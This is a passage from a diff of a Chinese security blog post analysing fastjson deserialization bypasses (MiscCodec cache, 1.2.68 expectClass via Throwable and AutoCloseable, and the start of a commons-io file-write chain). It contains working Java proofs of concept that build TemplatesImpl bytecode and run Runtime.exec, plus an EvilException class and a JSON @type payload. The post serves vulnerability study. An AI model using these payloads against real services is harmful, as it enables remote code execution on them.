+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">evilCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">bytecode</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;[{\&#34;@type\&#34;:\&#34;java.lang.Class\&#34;,\&#34;val\&#34;:\&#34;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">TEM_CLASS</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;\&#34;},{\&#34;@type\&#34;:\&#34;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">TEM_CLASS</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;\&#34;,\&#34;_bytecodes\&#34;:[\&#34;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">evilCode</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;\&#34;],\&#34;_name\&#34;:\&#34;hajimi\&#34;,\&#34;_tfactory\&#34;:{},\&#34;_outputProperties\&#34;:{}}]&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(payload);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">object</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="w"> </span><span class="n">Feature</span><span class="p">.</span><span class="na">SupportNonPublicField</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="nf">generatePayload</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;java.lang.Runtime.getRuntime().exec(\&#34;calc\&#34;);&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">cc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="na">makeClass</span><span class="p">(</span><span class="s">&#34;Test&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cc</span><span class="p">.</span><span class="na">makeClassInitializer</span><span class="p">().</span><span class="na">insertBefore</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cc</span><span class="p">.</span><span class="na">setSuperclass</span><span class="p">(</span><span class="n">pool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">AbstractTranslet</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">()));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">cc</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里用的是<code>[]</code>,其实用<code>{}</code>也行</p>
+<p>所以前面的<code>$ref</code>就能这样写,我们最终调用的是getoutputProperties方法，所以ref后面的就是outputProperties</p>
+<h5 id="poc-6">poc
+</h5><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassPool</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.CtClass</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Base64</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">MiscCodecAttack</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">TEM_CLASS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bytecode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">generatePayload</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">evilCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">bytecode</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;[{\&#34;@type\&#34;:\&#34;java.lang.Class\&#34;,\&#34;val\&#34;:\&#34;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">TEM_CLASS</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;\&#34;},{\&#34;@type\&#34;:\&#34;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">TEM_CLASS</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;\&#34;,\&#34;_bytecodes\&#34;:[\&#34;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">evilCode</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;\&#34;],\&#34;_name\&#34;:\&#34;hajimi\&#34;,\&#34;_tfactory\&#34;:{}},{\&#34;$ref\&#34;:\&#34;$[1].outputProperties\&#34;}]&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(payload);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">object</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="w"> </span><span class="n">Feature</span><span class="p">.</span><span class="na">SupportNonPublicField</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="nf">generatePayload</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;java.lang.Runtime.getRuntime().exec(\&#34;calc\&#34;);&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">cc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="na">makeClass</span><span class="p">(</span><span class="s">&#34;Test&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cc</span><span class="p">.</span><span class="na">makeClassInitializer</span><span class="p">().</span><span class="na">insertBefore</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cc</span><span class="p">.</span><span class="na">setSuperclass</span><span class="p">(</span><span class="n">pool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">AbstractTranslet</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">()));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">cc</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里无需设置<code>_outputProperties</code>字段，因为我们用ref调用了getoutputProperties,之前设置这个字段的原因是需要调用getoutputProperties使返回值类型继承map来满足fastjson调用getter方法的条件</p>
+<h2 id="fastjson-1268版本漏洞分析及commons-io写文件">fastjson 1.2.68版本漏洞分析及commons-io写文件
 </h2><p>参考：<a class="link" href="https://godownio.github.io/2024/10/28/fastjson-1.2.68-commons-io-xie-wen-jian/"  target="_blank" rel="noopener"
     >fastjson 1.2.68漏洞分析及commons-io写文件 | Godown_blog</a></p>
-
+<p>前面说过1.2.47之前的版本能用MiscCodec缓存绕过checkautoType检测，而1.2.48进行了修复</p>
+<p>TypeUtils.loadClass加了一个cache判断</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002141953052.png"
+	width="1191"
+	height="776"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002141953052_hu14546649478538502031.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002141953052_hu16924859479648329351.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251002141953052"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="153"
+		data-flex-basis="368px"
+	
+></p>
+<p>然后上面定义的bool值cache默认为false</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002142329672.png"
+	width="840"
+	height="99"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002142329672_hu8015014083602666601.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002142329672_hu3373182165656632253.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251002142329672"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="848"
+		data-flex-basis="2036px"
+	
+></p>
+<p>直接阻断了cache提前加载恶意类的攻击链路</p>
+<p>1.2.68有新的方法来绕过，可使用<code>expectClass</code>去绕过<code>checkAutoType()</code>检测机制，主要使用<code>Throwable</code>和 <code>AutoCloseable</code>来绕过</p>
+<p>在<code>1.2.68</code>版本下，更新了一个新的安全控制点 <code>safeMode</code>，如果开启的话，将在<code>checkAutoType()</code>直接抛出异常。从赋值可以看出，如果设置了<code>@type</code>就会抛出异常，开了safemode的直接打不了fastjson</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002144652458.png"
+	width="1072"
+	height="646"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002144652458_hu15572923665618653984.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002144652458_hu9055519292259025178.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251002144652458"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="165"
+		data-flex-basis="398px"
+	
+></p>
+<p>这个safemode默认是false,所以不用管，然后接着往下看这个版本checkautoType的实现</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002151708166.png"
+	width="1104"
+	height="809"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002151708166_hu1349153817891731416.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002151708166_hu11644871841033503325.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251002151708166"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="136"
+		data-flex-basis="327px"
+	
+></p>
+<p>可以看到还是getClassFromMapping方法从mapping读取类，然后要满足expectClass下面的那些条件，直接返回class，这里的条件是expectClass类不为空，获取的typeName不是hashmap，expectClass不是typeName的父类或者与他相同（其实就是expectClass是typeName的子类）</p>
+<p>在mappings初始化的时候，其中put了很多类，包括Exception和AutoCloseable,我们后续的攻击都是基于这两个接口</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002153408319.png"
+	width="746"
+	height="714"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002153408319_hu16874693793815866356.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002153408319_hu4698489584230106650.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251002153408319"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="104"
+		data-flex-basis="250px"
+	
+></p>
+<p>所以有没有办法控制expectClass来绕过判断直接返回我们的class呢，我们查找谁调用了checkautoType，因为</p>
+<p>expectClass就是checkautoType的第二个参数，我们要找到同样有参的方法</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002155719941.png"
+	width="899"
+	height="333"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002155719941_hu5391712798425733062.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002155719941_hu2653346648679992988.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251002155719941"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="269"
+		data-flex-basis="647px"
+	
+></p>
+<p>查找用法发现JavaBeanDesrtializer.deserialze和ThrowableDeserializer.deserialze都调用了带期望类参数的checkAutoType</p>
+<p>前者是fastjson默认反序列化器，后者是针对异常类的反序列化器</p>
+<p>由于缓存mappings的白名单是Exception，正好Exception是Throwable子类，所以我们如果调用实现了Exception类的类，就可以绕过</p>
+<h3 id="throwabledeserializer">ThrowableDeserializer
+</h3><p>在fastjson中，先是DefaultJSONParser.parse调用ParserConfig.checkAutoType检查和获取类，然后再是获取反序列化器调用deserialze</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002163100813.png"
+	width="1291"
+	height="819"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002163100813_hu12793482232934709623.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002163100813_hu16580259700590435881.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251002163100813"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="157"
+		data-flex-basis="378px"
+	
+></p>
+<p>如果这里deserializer是ThrowableDeserializer，并且下一个key为<code>@type</code>的话，就会再次调用checkAutoType，但是这里是Throwable.class作为expectClass</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002171919488.png"
+	width="1261"
+	height="534"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002171919488_hu18287158292189848271.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002171919488_hu10772351740641694440.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251002171919488"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="236"
+		data-flex-basis="566px"
+	
+></p>
+<p>如果我们这里传的第一个参数exClassName是恶意的实现了Throwable子类，就能命令执行。</p>
+<p>由于缓存mappings的白名单是Exception，正好Exception是Throwable子类，那实现Exception就能绕过，不过目前没有实现Exception的库类可以进一步利用，如果有写文件的功能的话就能利用了</p>
+<p>可以写入一个类继承Exception</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">EvilException</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">command</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setCommand</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">command</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">command</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">command</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;x&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span><span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;java.lang.Exception&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	 <span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;EvilException&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">	         <span class="nt">&#34;command&#34;</span><span class="p">:</span><span class="s2">&#34;calc&#34;</span><span class="p">},</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="javabeandeserializer">JavaBeanDeserializer
+</h3><p>ThrowableDeserializer#deserialze调用的checkAutoType中向期望类传参是固定的，为Throwable.class</p>
+<p>JavaBeanDeserializer#deserialze的expectClass参数是用户可控的</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002172113280.png"
+	width="996"
+	height="196"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002172113280_hu17192512972428991673.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002172113280_hu14148920707099696014.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251002172113280"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="508"
+		data-flex-basis="1219px"
+	
+></p>
+<p>其中这个type来自deserialze的参数传入</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002172756304.png"
+	width="805"
+	height="277"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002172756304_hu1981554769649453403.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251002172756304_hu16871304236621933839.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251002172756304"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="290"
+		data-flex-basis="697px"
+	
+></p>
+<p>然后这里的expectClass选择为AutoCloseable，前面提到AutoCloseable为mappings白名单里面的类,而且用到AutoCloseable的很多，其中包括了输入ObjectInput和输出ObjectOutput接口</p>
+<p>于是出现了输入流转输出流写文件，输出流转输入流读文件的操作</p>
+<p>现在我们的问题是怎么找到AutoCloseable的子类来进行输入流和输出流的互转？</p>
+<p>我们知道fastjson对方法的调用还是要落实到setter、getter和构造方法上的</p>
+<p>给出写文件的利用条件：</p>
+<ul>
+<li>需要一个通过 set 方法或构造方法指定文件路径的 OutputStream（作为输出文件流）</li>
+<li>需要一个通过 set 方法或构造方法传入字节数据的 OutputStream，并且可以通过 set 方法或构造方法传入一个 OutputStream，最后可以通过 write 方法将传入的字节码 write 到传入的 OutputStream（作为一个OutputStream转为另一个OutputStream的桥梁）</li>
+<li>需要一个通过 set 方法或构造方法传入一个 OutputStream，并且可以通过调用 toString、hashCode、get、set、构造方法调用传入的 OutputStream 的 flush 方法（用于将缓冲区中的数据写入目标输入流）</li>
+</ul>
+<p>下面介绍通用的写文件手法：</p>
+<h3 id="commons-io-2x写文件">Commons-io 2.x写文件
+</h3><p>先导入依赖</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>commons-io<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>commons-io<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>2.5<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="调用任意inputstreamread">调用任意InputStream.read
+</h4><p>commons-io包中的XmlStreamReader方法</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003153550870.png"
+	width="1221"
+	height="265"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003153550870_hu10682564509303748556.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003153550870_hu18128986115010573954.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251003153550870"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="460"
+		data-flex-basis="1105px"
+	
+></p>
+<p>参数中接收一个InputStream参数，下面用BufferedInputStream包装它，最后调用了doHttpStream方法</p>
+<p>这个BufferedInputStream我们看看是啥</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003153943523.png"
+	width="854"
+	height="126"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003153943523_hu10507956784396124115.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003153943523_hu4307241017574326830.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251003153943523"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="677"
+		data-flex-basis="1626px"
+	
+></p>
+<p>首先是继承了FilterInputStream，然后看看构造函数</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003154016655.png"
+	width="903"
+	height="224"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003154016655_hu18226037797763599152.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003154016655_hu6291343604478387423.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251003154016655"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="403"
+		data-flex-basis="967px"
+	
+></p>
+<p>调用了父类的构造器</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003154132449.png"
+	width="701"
+	height="126"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003154132449_hu8821124303287206992.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003154132449_hu4049242213040744382.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251003154132449"
+	
+	
